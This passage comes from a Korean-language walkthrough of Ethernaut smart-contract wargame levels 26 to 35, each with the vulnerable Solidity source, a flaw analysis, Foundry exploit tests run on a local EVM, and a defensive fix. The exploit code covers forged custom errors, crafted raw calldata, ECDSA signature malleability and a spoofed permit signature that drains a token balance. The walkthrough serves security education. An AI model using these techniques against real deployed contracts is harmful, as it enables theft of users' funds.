function testSolve() public {
        vm.startPrank(player);

        Forta forta = instance.forta();
        DetectionBot bot = new DetectionBot(address(forta));

        forta.setDetectionBot(address(bot));

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 26 DoubleEntryPoint 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-26-doubleentrypoint.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

래퍼가 아니라 실제 underlying 이동 경로를 감시한다.

### Level 27 — Good Samaritan

#### 문제 설명과 목표

지갑의 Coin을 모두 받는다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>GoodSamaritan.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

</details>

#### 코드 분석

공격자의 `notify(uint256)`가 10 토큰을 받을 때만 `NotEnoughBalance()` custom error를 발생시킨다. Wallet은 이 에러 선택자를 잔고 부족으로 오인해 `transferRemainder()`를 실행한다. 외부 컨트랙트가 낸 에러의 출처를 확인하지 않고 제어 흐름에 사용하면 안 된다.

#### 풀이 과정

1. notify에서 10을 받을 때 NotEnoughBalance custom error를 위조해 transferRemainder 분기를 유도한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        instance.requestDonation();

        GoodSamaritanAttack attacker = new GoodSamaritanAttack(address(instance));
        attacker.attack();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 27 Good Samaritan 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-27-good-samaritan.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

외부 에러 selector를 인증된 상태 신호처럼 사용하지 않는다.

## 7. Level 28–37: calldata, 회계, 서명과 비트 패킹

### Level 28 — Gatekeeper Three

#### 문제 설명과 목표

세 gate를 만족한다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>GatekeeperThree.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

</details>

#### 코드 분석

`construct0r()`로 owner가 되고, SimpleTrick을 만든 뒤 storage에서 password를 읽어 `getAllowance()`를 통과한다. 공격 컨트랙트는 `receive()`에서 revert하도록 하고 대상에 0.001 ETH보다 조금 넘게 강제 전송한 뒤 `enter()`를 호출한다.

#### 풀이 과정

1. construct0r로 owner가 되고 storage password로 allowance를 얻은 뒤 강제 송금과 revert receive를 조합한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player, player);

        GatekeeperThreeAttack attacker =
            new GatekeeperThreeAttack{value: 120000000000000000}(payable(address(instance)));
        attacker.attack();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 28 Gatekeeper Three 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-28-gatekeeper-three.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

함수명·비밀 storage·ETH 전송 성공 여부를 권한 gate로 엮지 않는다.

### Level 29 — Switch

#### 문제 설명과 목표

off 검사와 다른 calldata를 실행해 switch를 켠다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Switch.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

</details>

#### 코드 분석

함수는 calldata 고정 오프셋의 selector만 검사하지만 실제 ABI 디코더는 공격자가 지정한 동적 배열 offset을 따른다. 허용된 `turnSwitchOff()`를 검사 위치에 두고, 실제 실행 데이터 위치에는 `turnSwitchOn()`을 놓은 raw calldata를 보낸다. 검증 대상과 실행 대상은 반드시 같은 디코딩 결과여야 한다.

#### 풀이 과정

1. 검사되는 고정 offset에는 turnSwitchOff selector를 두고 ABI 동적 offset이 가리키는 위치에는 turnSwitchOn을 둔다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);

        bytes memory data = abi.encodeWithSelector(
            bytes4(keccak256("flipSwitch(bytes)")), abi.encodeWithSelector(bytes4(keccak256("turnSwitchOff()")))
        );
        (bool success, bytes memory err) = address(instance).call(data);
        if (!success) {
            console.logBytes(err);
        }
        assertTrue(!instance.switchOn());

        data =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff20606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (success, err) = address(instance).call(data);
        if (!success) {
            console.logBytes(err);
        }

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 29 Switch 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-29-switch.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

검증과 실행에 동일한 canonical decode 결과를 사용한다.

### Level 30 — HigherOrder

#### 문제 설명과 목표

treasury를 255보다 크게 만든다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>HigherOrder.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;

    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

</details>

#### 코드 분석

`registerTreasury(uint8)` ABI를 정상 인코딩하지 않고 selector 뒤에 256비트 값 256을 직접 붙인다. assembly의 `calldataload(4)`는 전체 32바이트를 읽으므로 `uint8` 의도와 다르게 treasury가 256이 되고 commander를 획득한다.

#### 풀이 과정

1. selector 뒤에 uint256 256을 raw calldata로 넣어 assembly calldataload와 ABI uint8 기대의 차이를 이용한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player, player);

        new HigherOrderAttack().attack(address(instance));
        instance.claimLeadership();

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 30 HigherOrder 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-30-higherorder.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

assembly 입력에 명시적 마스크와 범위 검사를 적용한다.

### Level 31 — Stake

#### 문제 설명과 목표

내부 totalStaked와 실제 잔고 불변식을 깨뜨린다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Stake.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

</details>

#### 코드 분석

외부 WETH `transferFrom()`의 반환값을 확인하지 않은 채 내부 `totalStaked`와 사용자 잔고를 올린다. 이후 ETH stake/unstake를 조합해 내부 회계와 실제 ETH 잔고를 어긋나게 한다. 토큰 호출은 성공 bool, 실제 수령량, fee-on-transfer 가능성까지 검증해야 한다.

#### 풀이 과정

1. false를 반환하는 WETH transferFrom을 성공처럼 계상한 뒤 ETH stake와 unstake를 조합한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);
    
        StakeAttack attacker = new StakeAttack();
        attacker.attack{value: 0.001 ether + 2}(instance);

        ERC20 dweth = ERC20(instance.WETH());
        dweth.approve(address(instance), type(uint256).max);
        instance.StakeWETH(0.001 ether + 1);
        instance.Unstake(0.001 ether + 1);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 31 Stake 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-31-stake.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

SafeERC20과 balance delta를 검증한다.

### Level 32 — Impersonator

#### 문제 설명과 목표

서명 가변성으로 locker를 연다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>Impersonator.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "openzeppelin-contracts-08/access/Ownable.sol";

// SlockDotIt ECLocker factory
contract Impersonator is Ownable {
    uint256 public lockCounter;
    ECLocker[] public lockers;

    event NewLock(address indexed lockAddress, uint256 lockId, uint256 timestamp, bytes signature);

    constructor(uint256 _lockCounter) {
        lockCounter = _lockCounter;
    }

    function deployNewLock(bytes memory signature) public onlyOwner {
        // Deploy a new lock
        ECLocker newLock = new ECLocker(++lockCounter, signature);
        lockers.push(newLock);
        emit NewLock(address(newLock), lockCounter, block.timestamp, signature);
    }
}

contract ECLocker {
    uint256 public immutable lockId;
    bytes32 public immutable msgHash;
    address public controller;
    mapping(bytes32 => bool) public usedSignatures;

    event LockInitializated(address indexed initialController, uint256 timestamp);
    event Open(address indexed opener, uint256 timestamp);
    event ControllerChanged(address indexed newController, uint256 timestamp);

    error InvalidController();
    error SignatureAlreadyUsed();

    /// @notice Initializes the contract the lock
    /// @param _lockId uinique lock id set by SlockDotIt's factory
    /// @param _signature the signature of the initial controller
    constructor(uint256 _lockId, bytes memory _signature) {
        // Set lockId
        lockId = _lockId;

        // Compute msgHash
        bytes32 _msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
            mstore(0x1C, _lockId) // 32 bytes
            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
        }
        msgHash = _msgHash;

        // Recover the initial controller from the signature
        address initialController = address(1);
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, _msgHash) // 32 bytes
            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
            pop(
                staticcall(
                    gas(), // Amount of gas left for the transaction.
                    initialController, // Address of `ecrecover`.
                    ptr, // Start of input.
                    0x80, // Size of input.
                    0x00, // Start of output.
                    0x20 // Size of output.
                )
            )
            if iszero(returndatasize()) {
                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
                revert(0x1c, 0x04)
            }
            initialController := mload(0x00)
            mstore(0x40, add(ptr, 128))
        }

        // Invalidate signature
        usedSignatures[keccak256(_signature)] = true;

        // Set the controller
        controller = initialController;

        // emit LockInitializated
        emit LockInitializated(initialController, block.timestamp);
    }

    /// @notice Opens the lock
    /// @dev Emits Open event
    /// @param v the recovery id
    /// @param r the r value of the signature
    /// @param s the s value of the signature
    function open(uint8 v, bytes32 r, bytes32 s) external {
        address add = _isValidSignature(v, r, s);
        emit Open(add, block.timestamp);
    }

    /// @notice Changes the controller of the lock
    /// @dev Updates the controller storage variable
    /// @dev Emits ControllerChanged event
    /// @param v the recovery id
    /// @param r the r value of the signature
    /// @param s the s value of the signature
    /// @param newController the new controller address
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }

    function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        require (_address == controller, InvalidController());

        bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
        require (!usedSignatures[signatureHash], SignatureAlreadyUsed());

        usedSignatures[signatureHash] = true;

        return _address;
    }
}
```

</details>

#### 코드 분석

ECDSA에서 `(r, s, v)`와 `(r, n-s, flipped-v)`가 같은 signer를 복구할 수 있는 가변성을 이용한다. 원본 서명에서 `s' = secp256k1n - s`, `v' = 28`을 만들어 controller를 바꾼다. low-s 정규화와 OpenZeppelin ECDSA 구현을 사용해야 한다.

#### 풀이 과정

1. s를 curve order에서 빼고 v를 뒤집어 같은 signer가 복구되는 새 서명을 만든다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player);
        // https://eips.ethereum.org/EIPS/eip-2
        // flip the s value from s to secp256k1n - s, flip the v value (27 -> 28, 28 -> 27), and the resulting signature would still be valid.
        uint256 secp256k1_n = 115792089237316195423570985008687907852837564279074904382605163141518161494337;
        bytes32 tricked_s = bytes32(secp256k1_n - uint256(s));
     
        vm.expectEmit();
        emit ECLocker.ControllerChanged(address(0), block.timestamp);

        ECLocker locker0 = instance.lockers(0);
        locker0.changeController(28, r, tricked_s, address(0));

        vm.expectEmit();
        emit ECLocker.Open(address(0), block.timestamp);
        locker0.open(0, 0, 0);
        
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 32 Impersonator 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-32-impersonator.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

low-s 정규화와 표준 ECDSA 구현을 사용한다.

### Level 33 — Magic Animal Carousel

#### 문제 설명과 목표

currentCrateId를 uint16 최대값으로 만든다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>MagicAnimalCarousel.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract MagicAnimalCarousel {
    uint16 constant public MAX_CAPACITY = type(uint16).max;
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);

    uint256 public currentCrateId;
    mapping(uint256 crateId => uint256 animalInside) public carousel;

    error AnimalNameTooLong();
    error CrateNotInitialized();

    constructor() {
        carousel[0] ^= 1 << 160;
    }

    function setAnimalAndSpin(string calldata animal) external {
        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
        carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);

        currentCrateId = nextCrateId;
    }

    function changeAnimal(string calldata animal, uint256 crateId) external {
        uint256 crate = carousel[crateId];
        require(crate != 0, CrateNotInitialized());
        
        address owner = address(uint160(crate & OWNER_MASK));
        if (owner != address(0)) {
            require(msg.sender == owner);
        }
        uint256 encodedAnimal = encodeAnimalName(animal);
        if (encodedAnimal != 0) {
            // Replace animal
            carousel[crateId] =
                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender); 
        } else {
            // If no animal specified keep same animal but clear owner slot
            carousel[crateId]= (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
        }
    }

    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
        require(bytes(animalName).length <= 12, AnimalNameTooLong());
        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
    }
}
```

</details>

#### 코드 분석

동물 이름, owner, crate ID가 한 storage word에 비트 패킹되어 있다. `changeAnimal()`에 비표준 길이의 raw calldata를 넣어 마스킹 밖의 비트까지 영향을 주고, 다음 spin에서 `currentCrateId`를 `uint16.max`로 만든다. assembly/비트 연산은 필드별 마스크와 범위를 명시해야 한다.

#### 풀이 과정

1. 비정상 raw calldata로 packed word의 crate ID 비트를 덮은 뒤 다음 spin을 실행한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player, player);
        instance.setAnimalAndSpin("Echidna");
        bytes memory payload = abi.encodePacked(uint256(64), uint256(1), uint256(12), hex"31323334353637383930ffff");
        (bool success, ) = address(instance).call(abi.encodePacked(instance.changeAnimal.selector, payload));
        assertTrue(success);
        instance.setAnimalAndSpin("Pidgeon");
        assertEq(instance.currentCrateId(), type(uint16).max);
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 33 Magic Animal Carousel 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-33-magic-animal-carousel.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

필드별 비트 마스크와 calldata 길이를 엄격히 검사한다.

### Level 34 — Bet House

#### 문제 설명과 목표

Pool과 BetHouse의 합성 회계를 깨뜨린다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>BetHouse.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import {Ownable} from "openzeppelin-contracts-08/access/Ownable.sol";
import {ReentrancyGuard} from "openzeppelin-contracts-08/security/ReentrancyGuard.sol";

contract BetHouse {
    address public pool;
    uint256 private constant BET_PRICE = 20;
    mapping(address => bool) private bettors;

    error InsufficientFunds();
    error FundsNotLocked();

    constructor(address pool_) {
        pool = pool_;
    }

    function makeBet(address bettor_) external {
        if (Pool(pool).balanceOf(msg.sender) < BET_PRICE) {
            revert InsufficientFunds();
        }
        if (!Pool(pool).depositsLocked(msg.sender)) revert FundsNotLocked();
        bettors[bettor_] = true;
    }

    function isBettor(address bettor_) external view returns (bool) {
        return bettors[bettor_];
    }
}

contract Pool is ReentrancyGuard {
    address public wrappedToken;
    address public depositToken;

    mapping(address => uint256) private depositedEther;
    mapping(address => uint256) private depositedPDT;
    mapping(address => bool) private depositsLockedMap;
    bool private alreadyDeposited;

    error DepositsAreLocked();
    error InvalidDeposit();
    error AlreadyDeposited();
    error InsufficientAllowance();

    constructor(address wrappedToken_, address depositToken_) {
        wrappedToken = wrappedToken_;
        depositToken = depositToken_;
    }

    /**
     * @dev Provide 10 wrapped tokens for 0.001 ether deposited and
     *      1 wrapped token for 1 pool deposit token (PDT) deposited.
     *  The ether can only be deposited once per account.
     */
    function deposit(uint256 value_) external payable {
        // check if deposits are locked
        if (depositsLockedMap[msg.sender]) revert DepositsAreLocked();

        uint256 _valueToMint;
        // check to deposit ether
        if (msg.value == 0.001 ether) {
            if (alreadyDeposited) revert AlreadyDeposited();
            depositedEther[msg.sender] += msg.value;
            alreadyDeposited = true;
            _valueToMint += 10;
        }
        // check to deposit PDT
        if (value_ > 0) {
            if (PoolToken(depositToken).allowance(msg.sender, address(this)) < value_) revert InsufficientAllowance();
            depositedPDT[msg.sender] += value_;
            PoolToken(depositToken).transferFrom(msg.sender, address(this), value_);
            _valueToMint += value_;
        }
        if (_valueToMint == 0) revert InvalidDeposit();
        PoolToken(wrappedToken).mint(msg.sender, _valueToMint);
    }

    function withdrawAll() external nonReentrant {
        // send the PDT to the user
        uint256 _depositedValue = depositedPDT[msg.sender];
        if (_depositedValue > 0) {
            depositedPDT[msg.sender] = 0;
            PoolToken(depositToken).transfer(msg.sender, _depositedValue);
        }

        // send the ether to the user
        _depositedValue = depositedEther[msg.sender];
        if (_depositedValue > 0) {
            depositedEther[msg.sender] = 0;
            payable(msg.sender).call{value: _depositedValue}("");
        }

        PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));
    }

    function lockDeposits() external {
        depositsLockedMap[msg.sender] = true;
    }

    function depositsLocked(address account_) external view returns (bool) {
        return depositsLockedMap[account_];
    }

    function balanceOf(address account_) public view returns (uint256) {
        return PoolToken(wrappedToken).balanceOf(account_);
    }
}

contract PoolToken is ERC20, Ownable {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) Ownable() {}

    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }
}
```

</details>

#### 코드 분석

Pool과 BetHouse 사이 토큰·ETH 회계 순서와 외부 상호작용을 공격 컨트랙트로 엮는다. 소량의 PoolToken을 공격 컨트랙트에 넘기고 0.001 ETH로 공격을 시작해 인스턴스의 종료 조건을 만든다. 여러 컨트랙트의 합성 상태를 하나의 불변식으로 검사해야 한다.

#### 풀이 과정

1. 공격 컨트랙트에 PoolToken을 넘기고 소액 ETH로 callback·정산 순서를 조합한다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player, player);
        BetHouseAttack attackContract =
            new BetHouseAttack(address(instance), payable(instance.pool()), Pool(instance.pool()).depositToken());
        PoolToken(Pool(instance.pool()).depositToken()).transfer(address(attackContract), 5);
        attackContract.attack{value: 0.001 ether}();
        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 34 Bet House 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-34-bet-house.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

여러 컨트랙트에 걸친 자산 불변식을 검증한다.

### Level 35 — Elliptic Token

#### 문제 설명과 목표

Alice의 토큰을 permit으로 빼낸다.

#### 핵심 컨트랙트 코드

<details markdown="1">
<summary>EllipticToken.sol 전체 코드 펼치기</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Ownable} from "openzeppelin-contracts-08/access/Ownable.sol";
import {ECDSA} from "openzeppelin-contracts-08/utils/cryptography/ECDSA.sol";
import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract EllipticToken is Ownable, ERC20 {
    error HashAlreadyUsed();
    error InvalidOwner();
    error InvalidReceiver();
    error InvalidSpender();

    constructor() ERC20("EllipticToken", "ETK") {}

    mapping(bytes32 => bool) public usedHashes;

    function redeemVoucher(
        uint256 amount,
        address receiver,
        bytes32 salt,
        bytes memory ownerSignature,
        bytes memory receiverSignature
    ) external {
        bytes32 voucherHash = keccak256(abi.encodePacked(amount, receiver, salt));
        require(!usedHashes[voucherHash], HashAlreadyUsed());

        // Verify that the owner emitted the voucher
        require(ECDSA.recover(voucherHash, ownerSignature) == owner(), InvalidOwner());

        // Verify that the receiver accepted the voucher
        require(ECDSA.recover(voucherHash, receiverSignature) == receiver, InvalidReceiver());

        // Nullify the voucher
        usedHashes[voucherHash] = true;

        // Mint the tokens
        _mint(receiver, amount);
    }

    function permit(uint256 amount, address spender, bytes memory tokenOwnerSignature, bytes memory spenderSignature)
        external
    {
        bytes32 permitHash = keccak256(abi.encode(amount));
        require(!usedHashes[permitHash], HashAlreadyUsed());
        require(!usedHashes[bytes32(amount)], HashAlreadyUsed());

        // Recover the token owner that emitted the permit
        address tokenOwner = ECDSA.recover(bytes32(amount), tokenOwnerSignature);

        // Verify that the spender accepted the permit
        bytes32 permitAcceptHash = keccak256(abi.encodePacked(tokenOwner, spender, amount));
        require(ECDSA.recover(permitAcceptHash, spenderSignature) == spender, InvalidSpender());

        // Nullify the permit
        usedHashes[permitHash] = true;

        // Approve the spender
        _approve(tokenOwner, spender, amount);
    }
}
```

</details>

#### 코드 분석

잘못 구성된 타원곡선 서명 검증으로 Alice의 permit 서명을 위조하고, 플레이어의 acceptance 서명을 결합한다. 승인량을 크게 설정한 뒤 `transferFrom(ALICE, player, INITIAL_AMOUNT)`로 잔고를 비운다. 서명 대상에는 체인 ID, 컨트랙트 주소, nonce, 만료시간을 포함한 명확한 도메인이 필요하다.

#### 풀이 과정

1. 곡선 검증 약점으로 Alice 서명을 위조하고 플레이어 acceptance 서명을 결합해 allowance를 만든다.

#### 익스플로잇 / 검증 코드

```solidity
function testSolve() public {
        vm.startPrank(player, player);

        // Spoofed signature generated with EllipticToken.py script
        bytes32 r = 0xd3433fe216c991674d4c7e2186460a412b91c976c44569433a0985dffc099b02;
        bytes32 s = 0x16417451991575e0cdfc4aaff865deb0843abf95f606aed775fda4e40e047e14;
        uint8 v = 27;
        uint256 amount = uint256(0x59e540931475e32e9ace9d434a5667767f569cd3c8316ea28398398bac06df55);
        bytes memory aliceSpoofedSignature = abi.encodePacked(r, s, v);

        // Permit acceptance signature
        bytes32 permitAcceptHash = keccak256(abi.encodePacked(ALICE, player, amount));
        (v, r, s) = vm.sign(playerKey, permitAcceptHash);
        bytes memory playerPermitAcceptanceSignature = abi.encodePacked(r, s, v);

        // Call permit to approve the transfer
        instance.permit(amount, player, aliceSpoofedSignature, playerPermitAcceptanceSignature);

        // Drain the funds
        instance.transferFrom(ALICE, player, INITIAL_AMOUNT);

        assertTrue(submitLevelInstance(ethernaut, address(instance)));
    }
```

#### 풀이 완료 확인

![Level 35 Elliptic Token 로컬 검증 완료](/assets/img/ethernaut-all-clear/levels/level-35-elliptic-token.png)
_공식 소스 기반 로컬 EVM 검증. 공격 후 레벨별 완료 조건을 확인했다._

#### 안전한 구현 방향

